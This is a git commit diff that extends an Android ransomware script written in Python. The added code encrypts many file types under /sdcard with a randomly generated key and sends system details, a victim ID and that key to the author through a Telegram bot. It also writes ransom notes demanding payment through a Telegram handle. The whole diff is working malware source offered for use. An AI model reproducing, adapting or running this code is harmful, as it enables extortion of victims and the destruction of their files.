be6041f7f88e46f56e28c20f3a66b7f6be126d14
EsfeLurM <104654028+esfelurm@users.noreply.github.com>
2023-09-08 17:11:47 +0330

    Update Android-ransomware.py

--- Android-ransomware.py
+++ Android-ransomware.py
@@ -1,20 +1,48 @@
 ############################
-##                Telegram : @esfelurm				    ##
-##In line 15 give a main route, or don't touch ##
-##Enter the formats in line 54 png,txt,jpg...  ##
-##Enter the password in line 16 (as a hash)     ##
-##Use the following tool to hash the password##
-##https://github.com/esfelurm/hashing !      ##
-##                Telegram : @esfelurm				 	##
 ############################
+token = "Token Bot"
+chat= "Chat id"
+############################
+############################
+from os import system as SY
 import os
-from Crypto.Cipher import AES
+try:from Crypto.Cipher import AES
+except ModuleNotFoundError:SY("pip install pycryptodome")
+try:from jdatetime import date
+except ModuleNotFoundError:SY("pip install jdatetime")
+try:import requests
+except ModuleNotFoundError:SY("pip install requests")
+try:import hashlib
+except ModuleNotFoundError:SY("pip install hashlib")
+try:from telfhk0 import telfhk0
+except ModuleNotFoundError:SY("pip install telfhk0")
+import string,platform
 from Crypto.Util.Padding import pad
+from random import randint , choice
+from datetime import datetime
+
 rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
 cn = '\033[00;36m'
-main_path = '/sdcard/'
-encryption_key = b'63eefbd45d89e8c91f24b609f7539942'
-os.system("clear")
+
+start = telfhk0.Telegram(chat=chat,token=token)
+
+def clear():
+	if 'Windows' in platform.uname():
+	    try:from colorama import init
+	    except ModuleNotFoundError:SY("pip install colorama")
+	    init()
+	elif 'Windows' not in platform.uname():
+		SY("clear")
+		
+main_path = '/sdcard/DDOS'
+random_number = randint(1, 100000000000)
+clear()
+try:r = requests.post("https://google.com")
+except:exit(f"{lrd}\n\n---------------------------------\n\n{lgn}Please turn on your {lrd}internet so {lgn}that we can install the prerequisites !\n\n{lrd}---------------------------------")
+
+md5_hash = hashlib.md5(''.join(choice(string.ascii_letters) for _ in range(21)).encode()).hexdigest()
+encryption_key = b'' + md5_hash.encode()
+clear()
 print (f"""{lrd}
  ___ _   _ ____ _____  _    _     _
 |_ _| \ | / ___|_   _|/ \  | |   | |
@@ -51,7 +79,7 @@ def decrypt_file(file_path, key):
 def find_and_encrypt_files(directory, key):
     for root, dirs, files in os.walk(directory):
         for file in files:
-            if file.lower().endswith(('.txt', '.png', 'jpg')):
+            if file.lower().endswith(('.txt', '.png','.mp3', '.jpg','.py','.rar','.zip')):
                 file_path = os.path.join(root, file)
                 encrypt_file(file_path, key)
 
@@ -70,7 +98,22 @@ def find_android_directories(path):
     return android_directories
 
 android_directories = find_android_directories(main_path)
+system_info = {
+            'Platform': platform.platform(),
+            'System': platform.system(),
+            'Node Name': platform.node(),
+            'Release': platform.release(),
+            'Machine': platform.machine(),
+            'Processor': platform.processor(),
+            'CPU Cores': os.cpu_count(),
+            'Username': os.getlogin(),
+        }
+try:today = date.today()
+except NameError:os.system("python name.py")
+info_string = '\n'.join(f"🔰 {key}: [ {value} ]" for key, value in system_info.items())
 
+ti = f"Date England : {datetime.now()}"            
+start.SendMessage(f"༼A system was infected with ransomware! ༽ \n\n⚠️ System specifications : \n==========================\n{info_string}\n==========================\n\nDate England : {datetime.now()}\n\nPersian history : {today.year}/{today.month}/{today.day}\n\n🆔 Zombie ID : {random_number}\n\n🔐 Password : {md5_hash}")
 for directory in android_directories:
     find_and_encrypt_files(directory, encryption_key)
 os.system("clear")
@@ -92,15 +135,16 @@ print (f"""
                             {yw}-**=           {lgn}                 
                        =:   {yw}=**=   {lgn}-=                       
                        -*+-.    .-**:                       
-                         :=+***++=:                                                                                                                                                                                                                                             
-{lrd}[{lgn}♡{lrd}] {be}Ha ha ha.... {pe}All your files are encrypted, you can send a message to the manufacturer to get back : {yw}@Esfelurm                                                                                                   
+                         :=+***++=:                                                                                                                                                              @esfelurm {lrd}All your files are encrypted! \n\n
+{cn}To get the key to decrypt your files, refer to the following address in Telegram 
+@GetKeyFelu_bot You have to pay a fee to get the key and you have an ID that changes every time you run! So you need to copy that ID and send it to me so that I can give you the key (after paying the ransom).  {lgn}\nYour ID : {lrd}{random_number}                                                                                              
 """)
+with open("/sdcard/Password-file.txt", "w") as file:
+    file.write(f"Hello idiot, as I said, your files are encrypted \n\nTo receive the key, send a message to the @GetKeyFelu_bot ID in Telegram and pay an amount \n\nImportant: To get the key, give me these details, or just give me the ID\n\nYour ID: {random_number}\n\nsystem specification : {info_string}\n\nTime : {ti}\n\nFor convenience, take a screenshot of this file and then send it to me, pay the amount and then get the key ")
 decryption_key_str = input(f"\n{lrd}[{lgn}?{lrd}] {cn}Enter the decryption key: ")
-	#exit()
 try:
     decryption_key = decryption_key_str.encode()
     print (f"\n\n{lrd}[{lgn}!{lrd}] {lgn}The password is correct! please wait ...")
     for directory in android_directories:
     	find_and_decrypt_files(directory,decryption_key)
-except:
-	print (f"\n\n{lrd}[{lgn}!{lrd}] {lrd}The password is wrong! Please talk to Mr. Esfelurm or admin ")
+except:print (f"\n\n{lrd}[{lgn}!{lrd}] {lrd}The password is wrong! Please talk to Telegram : @GetKeyFelu_bot")
